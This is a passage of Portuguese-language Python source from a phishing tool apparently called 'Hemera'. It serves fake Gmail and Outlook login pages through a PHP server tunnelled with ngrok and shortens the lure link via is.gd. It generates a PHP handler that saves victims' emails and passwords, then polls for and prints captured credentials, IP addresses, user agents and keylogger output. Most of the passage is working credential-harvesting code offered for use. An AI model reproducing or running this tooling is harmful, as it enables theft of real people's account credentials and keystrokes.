                 continue
               elif (verificar_credenciais == True):
                 print ("\n" +  W + "--------------------------------------")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Coletados com Sucesso!" + G)
                 time.sleep(1.5)
                 arquivo_dados = open("templates/gmail/usernames.txt", "r")
                 base_de_dados = arquivo_dados.read()
                 conteudo_dados = base_de_dados.split()
                 usuario = str(conteudo_dados[1])
                 senha = str(conteudo_dados[3])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Email Gmail: " + G + "%s" %usuario)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Senha: " + G + "%s" %senha)
                 arquivo_dados.close()
                 arquivo_rede = open("templates/gmail/ip_log.txt", "r")
                 dados_de_rede = arquivo_rede.read()
                 conteudo_rede = dados_de_rede.split()
                 endereco_ip = str(conteudo_rede[1])
                 user_agent = str(conteudo_rede[3])
                 sistema_alvo = str(conteudo_rede[5])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Endereço IP: " + G + "%s" %endereco_ip)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Navegador: " + G + "%s" %user_agent)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Sistema Alvo: " + G + "%s" %sistema_alvo)
                 arquivo_rede.close()
                 print ("\n" +  W + "--------------------------------------")
                 os.popen("rm templates/gmail/usernames.txt > /dev/null 2>&1")
                 os.popen("rm templates/gmail/ip_log.txt > /dev/null 2>&1")
                 stop()
                 break
         else:
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = datetime.now()
               verificar_network = os.path.exists("templates/gmail/ip.txt")
               verificar_credenciais = os.path.exists("templates/gmail/usernames.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo acessou o Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de acesso do Phishing:", hora_atual)
                 os.system("mv templates/gmail/ip.txt templates/gmail/ip_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" +  W + "--------------------------------------")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Coletados com Sucesso!" + G)
                 time.sleep(1.5)
                 arquivo_dados = open("templates/gmail/usernames.txt", "r")
                 base_de_dados = arquivo_dados.read()
                 conteudo_dados = base_de_dados.split()
                 usuario = str(conteudo_dados[1])
                 senha = str(conteudo_dados[3])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Email Gmail: " + G + "%s" %usuario)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Senha: " + G + "%s" %senha)
                 arquivo_dados.close()
                 arquivo_rede = open("templates/gmail/ip_log.txt", "r")
                 dados_de_rede = arquivo_rede.read()
                 conteudo_rede = dados_de_rede.split()
                 endereco_ip = str(conteudo_rede[1])
                 user_agent = str(conteudo_rede[3])
                 sistema_alvo = str(conteudo_rede[5])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Endereço IP: " + G + "%s" %endereco_ip)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Navegador: " + G + "%s" %user_agent)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                 arquivo_rede.close()
                 print ("\n" +  W + "--------------------------------------")
                 os.popen("rm templates/gmail/usernames.txt > /dev/null 2>&1")
                 os.popen("rm templates/gmail/ip_log.txt > /dev/null 2>&1")
                 stop()
                 break
             else:
               print ("\n" + R + "[" + W + "-" + R + "]" + W + " Não foi possível Encurtar a URL %s" %url)
               time.sleep(2)
               phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
       else:
         print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível obter a URL do Ngrok")
         time.sleep(2.5)
         retorno = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja Tentar novamente? Y/n: " + G))
         if (retorno == "Y" or retorno == "y" or retorno == "yes" or retorno == "YES" or retorno == "s" or retorno == "sim"):
           banner_program()
           os.popen("pkill -f -2 php > /dev/null 2>&1")
           os.popen("killall -2 php > /dev/null 2>&1")
           os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
           os.popen("killall -2 ngrok > /dev/null 2>&1")
           os.popen("rm curl.txt > /dev/null 2>&1")
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           stop()
     else:
       print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Ngrok não está instalado!")
       install_ngrok = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja instalar o Ngrok? Y/n: " + G))
       if (install_ngrok == "Y" or install_ngrok == "y" or install_ngrok == "yes" or install_ngrok == "YES" or install_ngrok == "s" or install_ngrok == "sim"):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " Instalando Ngrok...")
         os.system("git clone https://github.com/PSecurity/ps.ngrok > /dev/null 2>&1")
         os.system("cd ps.ngrok && mv ngrok .. > /dev/null 2>&1 && cd .. && rm -rf ps.ngrok > /dev/null 2>&1 && chmod +x ngrok")
         time.sleep(40)
         verificar_instalacao = os.path.exists("ngrok")
         if (verificar_instalacao == True):
           banner_program()
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível instalar o Ngrok")
           stop()

   elif (template_phishing == "outlook"): #Phishing Outlook
     verificar_ngrok = os.path.exists("ngrok")
     if (verificar_ngrok == True):
       os.system("rm templates/microsoft/login.php")
       os.system("touch templates/microsoft/login.php")
       url_destiny = open("templates/microsoft/login.php", "w")
       conteudo = ('''<?php
        include 'ip.php';
        session_start();
        $pass = $_POST["passwd"];
        $email=$_SESSION["Email"];
        file_put_contents("usernames.txt", "EMAIL: " . $email . " PASS: " . $pass . "\n", FILE_APPEND);
        header('Location: %s');
        exit();
        session_destroy();
?>''' %url_action)
       url_destino = url_destiny.write(conteudo)
       url_destiny.close()
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor PHP...")
       os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
       os.popen("killall -2 ngrok > /dev/null 2>&1")
       os.popen("cd templates/microsoft && php -S 127.0.0.1:%i > /dev/null 2>&1" %porta)
       time.sleep(2.5)
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Iniciando Servidor Ngrok...")
       os.popen("./ngrok http %i > /dev/null 2>&1" %porta)
       time.sleep(10.5)
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing LAN: " + G + " http://127.0.0.1:%i" %porta)
       os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io' > curl.txt")
       url_ngrok = open("curl.txt", "r")
       ler_url_ngrok = url_ngrok.read()
       verificar_url_ngrok = "https://" in ler_url_ngrok
       if (verificar_url_ngrok == True):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
         url_ngrok.close()
         os.popen("rm curl.txt > /dev/null 2>&1")
         if (encurtar_url == "on" or encurtar_url == "ON" and keylogger == "on" or keylogger == "ON"):
           print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
           server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
           if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL Encurtada: " + G + "%s" %server.text)
             time.sleep(1.2)
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = datetime.now()
               verificar_network = os.path.exists("templates/microsoft/ip.txt")
               verificar_credenciais = os.path.exists("templates/microsoft/usernames.txt")
               verificar_keylogger = os.path.exists("templates/microsoft/KeyloggerData.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo acessou o Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de acesso do Phishing:", hora_atual)
                 os.system("mv templates/microsoft/ip.txt templates/microsoft/ip_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_keylogger == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Capturando dados do alvo...")
                 arquivo_keylogger = open("templates/microsoft/KeyloggerData.txt", "r")
                 keylogger_file = arquivo_keylogger.read()
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " O Alvo digitou: " + G + "%s" %keylogger_file)
                 arquivo_keylogger.close()
                 os.system("mv templates/microsoft/KeyloggerData.txt KeyloggerData_log.txt")
                 os.system("rm KeyloggerData_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" +  W + "--------------------------------------")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Coletados com Sucesso!" + G)
                 time.sleep(1.5)
                 arquivo_dados = open("templates/microsoft/usernames.txt", "r")
                 base_de_dados = arquivo_dados.read()
                 conteudo_dados = base_de_dados.split()
                 usuario = str(conteudo_dados[1])
                 senha = str(conteudo_dados[3])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Email Outlook: " + G + "%s" %usuario)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Senha: " + G + "%s" %senha)
                 arquivo_dados.close()
                 arquivo_rede = open("templates/microsoft/ip_log.txt", "r")
                 dados_de_rede = arquivo_rede.read()
                 conteudo_rede = dados_de_rede.split()
                 endereco_ip = str(conteudo_rede[8])
                 user_agent = str(conteudo_rede[10])
                 sistema_alvo = str(conteudo_rede[12])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Endereço IP: " + G + "%s" %endereco_ip)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Navegador: " + G + "%s" %user_agent)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                 arquivo_rede.close()
                 print ("\n" +  W + "--------------------------------------")
                 os.popen("rm templates/microsoft/usernames.txt > /dev/null 2>&1")
                 os.popen("rm templates/microsoft/ip_log.txt > /dev/null 2>&1")
                 stop()
                 break
         else:
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = datetime.now()
               verificar_network = os.path.exists("templates/microsoft/ip.txt")
               verificar_credenciais = os.path.exists("templates/microsoft/usernames.txt")
               if (verificar_network == True):
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " O Alvo acessou o Phishing!")
                 print ("\n" + W + "[" + G + "ONLINE" + W + "]" + P + " Horário de acesso do Phishing:", hora_atual)
                 os.system("mv templates/microsoft/ip.txt templates/microsoft/ip_log.txt > /dev/null 2>&1")
                 continue
               elif (verificar_credenciais == True):
                 print ("\n" +  W + "--------------------------------------")
                 print ("\n" + W + "[" + G + "+" + W + "]" + P + " Dados Coletados com Sucesso!" + G)
                 time.sleep(1.5)
                 arquivo_dados = open("templates/microsoft/usernames.txt", "r")
                 base_de_dados = arquivo_dados.read()
                 conteudo_dados = base_de_dados.split()
                 usuario = str(conteudo_dados[1])
                 senha = str(conteudo_dados[3])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Email Outlook: " + G + "%s" %usuario)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Senha: " + G + "%s" %senha)
                 arquivo_dados.close()
                 arquivo_rede = open("templates/microsoft/ip_log.txt", "r")
                 dados_de_rede = arquivo_rede.read()
                 conteudo_rede = dados_de_rede.split()
                 endereco_ip = str(conteudo_rede[8])
                 user_agent = str(conteudo_rede[10])
                 sistema_alvo = str(conteudo_rede[12])
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Endereço IP: " + G + "%s" %endereco_ip)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Navegador: " + G + "%s" %user_agent)
                 print ("\n" + W + "[" + G + "+" + W + "]" + C + " Sistema Operacional: " + G + "%s" %sistema_alvo)
                 arquivo_rede.close()
                 print ("\n" +  W + "--------------------------------------")
                 os.popen("rm templates/microsoft/usernames.txt > /dev/null 2>&1")
                 os.popen("rm templates/microsoft/ip_log.txt > /dev/null 2>&1")
                 stop()
                 break
             else:
               print ("\n" + R + "[" + W + "-" + R + "]" + W + " Não foi possível Encurtar a URL %s" %url)
               time.sleep(2)
               phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
       else:
         print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível obter a URL do Ngrok")
         time.sleep(2.5)
         retorno = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja Tentar novamente? Y/n: " + G))
         if (retorno == "Y" or retorno == "y" or retorno == "yes" or retorno == "YES" or retorno == "s" or retorno == "sim"):
           banner_program()
           os.popen("pkill -f -2 php > /dev/null 2>&1")
           os.popen("killall -2 php > /dev/null 2>&1")
           os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
           os.popen("killall -2 ngrok > /dev/null 2>&1")
           os.popen("rm curl.txt > /dev/null 2>&1")
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           stop()
     else:
       print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Ngrok não está instalado!")
       install_ngrok = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja instalar o Ngrok? Y/n: " + G))
       if (install_ngrok == "Y" or install_ngrok == "y" or install_ngrok == "yes" or install_ngrok == "YES" or install_ngrok == "s" or install_ngrok == "sim"):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " Instalando Ngrok...")
         os.system("git clone https://github.com/PSecurity/ps.ngrok > /dev/null 2>&1")
         os.system("cd ps.ngrok && mv ngrok .. > /dev/null 2>&1 && cd .. && rm -rf ps.ngrok > /dev/null 2>&1 && chmod +x ngrok")
         time.sleep(40)
         verificar_instalacao = os.path.exists("ngrok")
         if (verificar_instalacao == True):
           banner_program()
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível instalar o Ngrok")
           stop()

def menu_log():
   banner_program()
   os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
   os.popen("killall -2 ngrok > /dev/null 2>&1")
   arquivo_log = open("config_log.txt", "r")
   leitura_log = arquivo_log.read()
   definir_log = leitura_log.split()
   template_phishing = str(definir_log[0])
   porta = int(definir_log[1])
   url_action = str(definir_log[2])
   encurtar_url = str(definir_log[3])
   keylogger = str(definir_log[4])
   arquivo_log.close()
   print ("\n" + W + "[" + G + "+" + W + "]" + C + " Digite " + G + "help" + C + " ou " + G + "?" + C + " para obter ajuda")
   while (True):
        dados = str(input("\n" + W + "[" + B + "*" + W + "]" + " Hemera > " + G))
        prompt = dados.split()
        if (not prompt):
          continue
        elif (prompt[0] == "show" or prompt[0] == "SHOW" or prompt[0] == "show" and prompt[1] == "options"):
         try:
           banner_program()
           print ("\n" +  W + "--------------------------------------")
           print ("\n" +  C + "Template:" + G + "\t" + " %s" %template_phishing)
           print ("\n" +  C + "Porta:" + G + "\t\t" + " %i" %porta)
           print ("\n" +  C + "URL de Ação:" + G + "\t" + " %s" %url_action)
           print ("\n" +  C + "Encurtar URL:" + G + "\t" + " %s" %encurtar_url)
           print ("\n" +  C + "Keylogger:" + G + "\t" + " %s" %keylogger)
           print ("\n" +  W + "--------------------------------------")
           continue
         except IndexError:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Comando incompleto! use: " + W + "show options")
           time.sleep(2.5)
           banner_program()
        elif (prompt[0] == "help" or prompt[0] == "HELP" or prompt[0] == "h" or prompt[0] == "?"):
          banner_program()
          print ("\n" +  C + "Comando:" + W + " show options " + C + "=> " + R + "exibir configurações")
          print ("\n" +  C + "Comando:" + W + " display templates " + C + "=> " + G + "exibir templates disponiveis")
          print ("\n" +  C + "Comando:" + W + " set template (instagram,facebook,gmail) " + C + "=> " + R + "setar um Template")
          print ("\n" +  C + "Comando:" + W + " set porta (80,8080) " + C + "=> " + R + "setar uma Porta")
          print ("\n" +  C + "Comando:" + W + " set action url (link destino após o alvo cair no Phishing) " + C + "=> " + R + "setar uma URL de Destino")
          print ("\n" +  C + "Comando:" + W + " set url encurter (on,off) " + C + "=> " + R + "ativar ou desativar modo encurtar url do Phishing")
          print ("\n" +  C + "Comando:" + W + " set keylogger mode (on,off) " + C + "=> " + G + "ativar ou desativar modo Keylogger (captura de teclas do alvo)")
          print ("\n" +  C + "Comando:" + W + " help " + C + "=> " + R + "obter ajuda")
          print ("\n" +  C + "Comando:" + W + " exploit " + C + "=> " + R + "Executa o Phishing")
          print ("\n" +  C + "Comando:" + W + " sair " + C + "=> " + R + "sair do Programa")
        elif (prompt[0] == "set" and prompt[1] == "template"):
          try:
            template_phishing = str(prompt[2])
            if (template_phishing == "instagram" or template_phishing == "facebook" or template_phishing == "gmail" or template_phishing == "outlook"):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Template %s é inválido" %template_phishing)
              template_phishing = "Sem Template ativo"
              time.sleep(2.5)
              banner_program()
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " O comando está incorreto!")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "display" and prompt[1] == "templates" or prompt[0] == "DISPLAY" and prompt[1] == "TEMPLATES"):
          print ("\n" +  C + "Templates Disponiveis:" + G + " instagram,gmail,netflix,outlook")
          continue
        elif (prompt[0] == "set" and prompt[1] == "keylogger" and prompt[2] == "mode"):
          try:
            keylogger = str(prompt[3])
            if (keylogger == "on" or keylogger == "ON" or keylogger == "off" or keylogger == "OFF"):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite" + R + " on " + C + "ou " + R + "off")
              time.sleep(2.5)
              banner_program()
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite um valor válido")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "set" and prompt[1] == "porta"):
          try:
            porta = int(prompt[2])
            if (porta == 22 or porta == 23 or porta == 53 or porta == 443):
              porta = 8080
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A Porta digitada é usada por um serviço!")
              time.sleep(2.5)
              banner_program()
            else:
              continue
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite uma Porta válida")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "set" and prompt[1] == "url" and prompt[2] == "encurter"):
          try:
            encurtar_url = str(prompt[3])
          except IndexError:
            encurtar_url = "off"
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Valor inválido")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "set" and prompt[1] == "action" and prompt[2] == "url"):
          try:
            url_action = str(prompt[3])
            verificar_action = "https://" in url_action
            if (verificar_action == True):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A URL de Destino %s é inválida" %url_action)
              url_action = "Sem URL de Destino ativa"
              time.sleep(2.5)
              banner_program()
              continue
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite uma URL válida")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "exploit" or prompt[0] == "EXPLOIT" or prompt[0] == "run"):
            verificar_action_url = "https://" in url_action
            if (verificar_action_url == True):
              if (template_phishing == "Sem Template ativo"):
                print ("\n" + W + "[" + R + "-" + W + "]" + C + " A opção " + R + "set template " + C + "está incorreta!")
                time.sleep(2.5)
                banner_program()
              else:
                if (encurtar_url == "on" or encurtar_url == "ON" and keylogger == "on" or keylogger == "ON"):
                  os.system("touch config_log.txt")
                  arquivo = open("config_log.txt","w")
                  arquivo.write(template_phishing + "\n")
                  arquivo.write(str(porta))
                  arquivo.write("\n" + url_action)
                  arquivo.write("\n" + encurtar_url)
                  arquivo.write("\n" + keylogger)
                  arquivo.close()
                  phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
                  break
                elif (encurtar_url == "off" or encurtar_url == "OFF" and keylogger == "off" or keylogger == "OFF"):
                  os.system("touch config_log.txt")
                  arquivo = open("config_log.txt","w")
                  arquivo.write(template_phishing + "\n")
                  arquivo.write(str(porta))
                  arquivo.write("\n" + url_action)
                  arquivo.write("\n" + encurtar_url)
                  arquivo.write("\n" + keylogger)
                  arquivo.close()
                  phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
                  break
                else:
                  print ("\n" + W + "[" + R + "-" + W + "]" + C + " As opções " + R + "url encurter " + C + "e " + R + "keylogger mode " + C + "não podem ser diferentes!")
                  time.sleep(2.5)
                  banner_program()
                  continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A opção " + R + "action url" + C + " está incorreta!")
              time.sleep(2.5)
              banner_program()
        elif (prompt[0] == "sair" or prompt[0] == "SAIR" or prompt[0] == "quit"):
          stop()
          break
def stop():
   os.popen("pkill -f -2 php > /dev/null 2>&1")
   os.popen("killall -2 php > /dev/null 2>&1")
   os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
   os.popen("killall -2 ngrok > /dev/null 2>&1")
   time.sleep(1)
   os.popen("cd templates/instagram && rm usernames.txt > /dev/null 2>&1 && rm ip.txt > /dev/null 2>&1")
   os.popen("cd templates/netflix && rm usernames.txt > /dev/null 2>&1 && rm ip.txt > /dev/null 2>&1")
   os.popen("rm templates/instagram/ip_log.txt > /dev/null 2>&1")
   os.popen("rm KeyloggerData.txt > /dev/null 2>&1")
   os.popen("rm curl.txt > /dev/null 2>&1")
   sys.exit(1)

try:
  verificar_dependencias()
  menu_program()

except KeyboardInterrupt:
  stop()

finally:
  print ("\n" + W + "[" + G + "+" + W + "]" + C + " Obrigado por utilizar o Programa")
